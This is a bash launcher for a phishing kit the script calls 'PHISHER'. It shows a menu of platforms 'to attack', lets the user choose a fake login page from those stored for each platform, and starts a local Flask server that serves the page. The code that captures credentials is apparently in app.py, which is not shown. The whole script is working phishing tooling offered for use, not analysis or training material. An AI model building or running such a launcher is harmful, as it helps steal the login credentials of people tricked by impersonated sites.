#!/bin/bash

# ========== CONFIG ==========
PLATFORM_DIR="platforms"
VERSION="2.3.5"
AUTHOR="YourNameHere"
# ============================

# ========== COLORS ==========
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
RESET='\033[0m'
# ============================

clear

# ========== BANNER ==========
echo -e "${BLUE}  _____ _     _     _               "
echo -e " |  __ (_)   | |   (_)              "
echo -e " | |__) | ___| |__  _ _ __ ___  ___ "
echo -e " |  ___/ |/ __| '_ \| | '__/ _ \/ __|"
echo -e " | |   | | (__| | | | | | |  __/\__ \\"
echo -e " |_|   |_|\___|_| |_|_|_|  \___||___/"
echo -e "                                     Version : ${YELLOW}${VERSION}${RESET}"
echo ""

echo -e "${GREEN}[-] Tool Created by ${AUTHOR}${RESET}"
echo ""

# ========== PLATFORM SELECTION ==========
echo -e "${CYAN}[::] Select A Platform To Attack [::]${RESET}"
echo ""

platforms=()
i=1
for dir in "$PLATFORM_DIR"/*/; do
    platforms+=("$(basename "$dir")")
done

for index in "${!platforms[@]}"; do
    number=$(printf "%02d" $((index + 1)))
    printf "${YELLOW}[%02d]${RESET} %-15s" "$number" "${platforms[$index]}"
    if (( (index + 1) % 3 == 0 )); then echo ""; fi
done
echo ""
echo -e "${YELLOW}[99]${RESET} About         ${YELLOW}[00]${RESET} Exit"
echo ""
read -p "[-] Select an option : " platform_choice

# Exit and About
if [[ "$platform_choice" == "00" ]]; then
    echo -e "${BLUE}[*] Exiting...${RESET}"; exit 0
elif [[ "$platform_choice" == "99" ]]; then
    echo -e "${GREEN}[*] PHISHER by $AUTHOR | Version $VERSION${RESET}"
    echo -e "${WHITE}    A terminal-based phishing launcher.${RESET}"
    exit 0
fi

if ! [[ "$platform_choice" =~ ^[0-9]+$ ]] || (( platform_choice < 1 || platform_choice > ${#platforms[@]} )); then
    echo -e "${RED}❌ Invalid platform choice.${RESET}"; exit 1
fi

selected_platform="${platforms[$((platform_choice - 1))]}"
platform_path="$PLATFORM_DIR/$selected_platform/"

# ========== LOGIN PAGE SELECTION ==========
echo ""
echo -e "${CYAN}[::] Select a Login Page for ${selected_platform} [::]${RESET}"
echo ""

html_files=()
j=1
for file in "$platform_path"*.html; do
    if [[ -f "$file" ]]; then
        html_files+=("$(basename "$file")")
        printf "${YELLOW}[%02d]${RESET} %s\n" "$j" "$(basename "$file" .html | sed 's/-/ /g')"
        ((j++))
    fi
done

if [ ${#html_files[@]} -eq 0 ]; then
    echo -e "${RED}⚠️  No login pages found in ${platform_path}${RESET}"
    exit 1
fi

echo ""
read -p "[-] Select an option : " page_choice

if ! [[ "$page_choice" =~ ^[0-9]+$ ]] || (( page_choice < 1 || page_choice > ${#html_files[@]} )); then
    echo -e "${RED}❌ Invalid login page choice.${RESET}"; exit 1
fi

selected_file="${html_files[$((page_choice - 1))]}"
relative_path="$selected_platform/$selected_file"

# ========== FLASK LAUNCH ==========
echo ""
echo -e "${GREEN}[✔] Launching ${selected_platform} → ${selected_file}${RESET}"
echo -e "${BLUE}🚀 Flask server starting...${RESET}"
echo -e "${CYAN}🌐 Visit: http://127.0.0.1:5000${RESET}"
echo ""

LOGIN_PAGE="$relative_path" python3 app.py
